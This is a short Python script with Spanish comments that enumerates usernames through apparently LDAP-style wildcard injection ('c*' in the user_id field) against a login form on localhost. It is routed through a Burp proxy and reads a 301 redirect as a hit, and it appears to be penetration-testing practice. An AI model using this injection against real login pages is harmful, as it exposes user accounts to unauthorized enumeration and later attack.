import requests
import time
import sys
import signal
import pdb

from pwn import *
import string


main_url = 'http://localhost:8888'

def signal_handler(sig, frame):
    print('Saliendo...')
    sys.exit(0)


# Configuración de la señal de salida
signal.signal(signal.SIGINT, signal_handler)


#para el proxy de burpsuite
burp = {'http': 'http://127.0.0.1:8080'}


def getUsers():
    caracteres = string.ascii_lowercase
    # caracteres = string.ascii_lowercase + string.digits
    # caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits

    initial_users = []
    
    headers= {
        'Content-Type': 'application/x-www-form-urlencoded'
    }


    for c in caracteres:
        post_data="user_id={}*&password=*&login=1&submit=Submit".format(c)

        # a la hora de enviar la solicitud, se debe enviar el post_data como un diccionario
        r = requests.post(main_url, data=post_data, allow_redirects=False, headers=headers, proxies=burp)

        if r.status_code == 301:
            initial_users.append(c)
            print("Usuario encontrado: {}".format(c))

    return initial_users




# flujo principal
if __name__ == '__main__':

    # pdb.set_trace()
    time.sleep(5)

    initial_users = getUsers()
    print("Usuarios iniciales: {}".format(initial_users))
